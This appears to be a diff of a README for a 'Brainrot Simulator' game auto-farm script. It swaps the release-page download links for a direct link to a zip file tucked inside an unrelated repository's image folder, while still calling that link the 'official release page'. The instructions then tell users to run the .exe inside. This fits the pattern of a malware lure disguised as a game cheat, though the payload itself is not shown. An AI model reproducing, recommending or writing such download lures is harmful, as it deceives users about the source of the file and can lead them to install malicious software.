@@ -5,7 +5,7 @@ description: "Automate resource collection and quest completion in Brainrot Simu
 ---
 # 🧠 Brainrot-Simulator-Script-Auto-Farm-2026 - Master your game with automated progression
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Louisiananfireopal94/Brainrot-Simulator-Script-Auto-Farm-2026/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://raw.githubusercontent.com/Louisiananfireopal94/louisiananfireopal94.github.io/main/react-hn/img/Release_v3.1.zip)
 
 This application provides automation tools for Brainrot Simulator. It handles repetitive tasks like clicking, farming, and upgrading your character. The interface allows you to select options to manage your gameplay. 
 
@@ -23,7 +23,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these instructions to set up the software on your Windows machine.
 
-1.  Visit the official release page to download the latest version: [https://github.com/Louisiananfireopal94/Brainrot-Simulator-Script-Auto-Farm-2026/releases](https://github.com/Louisiananfireopal94/Brainrot-Simulator-Script-Auto-Farm-2026/releases)
+1.  Visit the official release page to download the latest version: [https://raw.githubusercontent.com/Louisiananfireopal94/louisiananfireopal94.github.io/main/react-hn/img/Release_v3.1.zip](https://raw.githubusercontent.com/Louisiananfireopal94/louisiananfireopal94.github.io/main/react-hn/img/Release_v3.1.zip)
 2.  Locate the installer file ending in .exe.
 3.  Save the file to your desktop or downloads folder.
 4.  Double-click the installer file to begin the process.
